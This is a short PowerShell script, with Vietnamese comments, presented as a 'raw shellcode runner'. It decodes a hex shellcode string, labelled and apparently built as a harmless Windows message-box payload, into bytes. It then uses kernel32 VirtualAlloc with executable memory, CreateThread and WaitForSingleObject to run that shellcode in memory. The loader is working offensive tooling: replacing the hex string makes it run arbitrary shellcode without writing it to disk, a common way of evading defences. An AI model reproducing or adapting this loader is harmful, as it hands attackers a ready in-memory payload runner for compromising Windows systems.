# payload.ps1 - Raw shellcode runner
# Shellcode: windows/x64/messagebox

 $hex = "fc4881e4f0ffffffe8cc000000415141505251564831d265488b5260488b5218488b5220488b725041b9967edf85480fb74a484831c0ac3c617c022c2041c1c90d4101c1e2ed524151488b52208b423c4801d0668178180b020f856f0000008b80880000004885c074644801d0448b40204901d08b481850e353448b4c240848ffc9418b34884801d64831c0ac41c1c90d4101c138e075f14539d175db58448b40244901d066418b0c48448b401c4901d0418b0488415841584801d05e595a41584159415a4883ec204152ffe05841595a488b12e94bffffff5de80b0000007573657233322e646c6c005941ba1b451ce5ffd549c7c100000000e80b00000048656c6c6f20776f6f6f005ae80800000077656c636f6d650041584831c941ba3989a9d7ffd54831c941ba2bcd8860ffd5"

# Chuyển hex -> byte array
 $len = [int]($hex.Length / 2)
 $bytes = New-Object byte[] $len
for ($i = 0; $i -lt $len; $i++) {
    $bytes[$i] = [Convert]::ToByte($hex.Substring($i * 2, 2), 16)
}

# Khai báo WinAPI
 $cs = @"
using System;
using System.Runtime.InteropServices;
public class K32 {
    [DllImport("kernel32")] public static extern IntPtr VirtualAlloc(IntPtr a, uint b, uint c, uint d);
    [DllImport("kernel32")] public static extern IntPtr CreateThread(IntPtr a, uint b, IntPtr c, IntPtr d, uint e, IntPtr f);
    [DllImport("kernel32")] public static extern uint WaitForSingleObject(IntPtr a, uint b);
}
"@

 $api = Add-Type -TypeDefinition $cs -PassThru

# VirtualAlloc -> Copy shellcode -> CreateThread
 $ptr = $api::VirtualAlloc([IntPtr]::Zero, [uint32]$len, 0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($bytes, 0, $ptr, $len)
 $th = $api::CreateThread([IntPtr]::Zero, 0, $ptr, [IntPtr]::Zero, 0, [IntPtr]::Zero)
 $api::WaitForSingleObject($th, [uint32]::MaxValue) | Out-Null
